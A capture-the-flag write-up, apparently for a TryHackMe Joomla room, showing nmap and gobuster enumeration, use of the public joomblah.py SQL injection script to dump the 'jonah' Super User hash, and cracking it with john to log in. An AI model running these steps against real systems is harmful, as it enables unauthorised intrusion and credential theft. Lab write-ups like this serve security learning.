# Enumeration
Using `nmap` to scan the target
```python
nmap -T4 -sV -vv -O -A -Pn  {IP} -oN nmap.txt
```
I outputed the scan result to `nmap.txt` file for later reviewing.
This is a brief of the result:
```note
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
```
Open Ports:
- 22 (ssh)
- 80 (http)
- 3306 (mysql)
  Also, this is a quick look at the target via `port 80`

![Image](https://github.com/user-attachments/assets/c728a98c-4dfb-4eea-96a9-c389c58b32a7)

After reading the article, the answer for Task 1 is `spiderman` without the `-`
Then I noticed the login section on the right of the post, I tried using some SQLi queries to enter but gaining nothing.
Then I used `gobuster` to find all the hidden path of this site
```python
gobuster dir -u "http://{IP}" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js,.txt -t 1000 2>/dev/null
```
And obtaining some interesting information
```note
/images               (Status: 301) [Size: 235] [--> http://10.10.73.116/images/]
/index.php            (Status: 200) [Size: 9278]
/includes             (Status: 301) [Size: 237] [--> http://10.10.73.116/includes/]
/components           (Status: 301) [Size: 239] [--> http://10.10.73.116/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.73.116/cache/]
/language             (Status: 301) [Size: 237] [--> http://10.10.73.116/language/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.73.116/libraries/]
/robots.txt           (Status: 200) [Size: 836]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.73.116/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.73.116/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.73.116/administrator/]
/htaccess.txt         (Status: 200) [Size: 3005]
/README.txt           (Status: 200) [Size: 4494]

```
I reckoned that I should check all the path that came with status `200` manually.
## Accessing  `/README.txt`
![Image](https://github.com/user-attachments/assets/eabd68bb-ac06-40d5-93ee-b4356df0de9e)
## Accessing   `/robots.txt`
![Image](https://github.com/user-attachments/assets/816cd781-e6c1-4f77-aaf7-83a0c4e73fd1)
## Accessing  `/htaccess.txt`
![Image](https://github.com/user-attachments/assets/e2820de9-5869-4c82-9f2e-88302f68d2b5)
Nothing special but I knew that the version of Joomla is 3.7.x for the target, then I assumed that the version is 3.7.0-9 about that range
Then I tried to find some credentials to login
and saw this hint:
![Image](https://github.com/user-attachments/assets/f2acf5a4-ac19-456d-9716-dd7c8a29b0d0)
So I Knew that ther http-generator : `joomla 3.7.x` then I just looked for some python vulnerabilities related to this generator and ended up with this
[joomblah.py](https://raw.githubusercontent.com/teranpeterson/Joomblah/refs/heads/master/joomblah.py) 
## Reference
[Joomblah](https://github.com/teranpeterson/Joomblah/tree/master)
So I had my SQLi python and carefully learned how to use it with `python3`
```python
python3 joomblah.py  "http://{ip}/index.php/component/users/\?view\=login\&Itemid\=101"
```
Obtaining the result 
```
Fetching CSRF token
Testing SQLi
Found table: fb9j5_users
Extracting users from fb9j5_users
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
Extracting sessions from fb9j5_session
```
I had username :`jonah`, and hashed password :`$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`
I acctually did not know what type of this hash is (I saved the hashed password into `password.txt` file) and just ended up coping and pasting to google for searching and found this post on [reddit](https://www.reddit.com/r/HowToHack/comments/m9w0at/why_isnt_john_cracking_this_bcrypt_hash/)
But I wanted to find it by myself then I kept searching, I found this tool called [Hash Type Identifier](https://hashes.com/en/tools/hash_identifier)
![Image](https://github.com/user-attachments/assets/5fd1c549-0149-43a1-9f06-d762a5d5ed48)
Then I could ensure that the hash type is `bcrypt`, moving next I used `john` do decrypt the hash
```python
john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```
and I found the password, by the way, I got the username too, therefore, I attempted to login.
![Image](https://github.com/user-attachments/assets/85c69d85-5e4c-4ca6-911b-010fed173ee8)
# Boom, Login Successfully~~!!! 


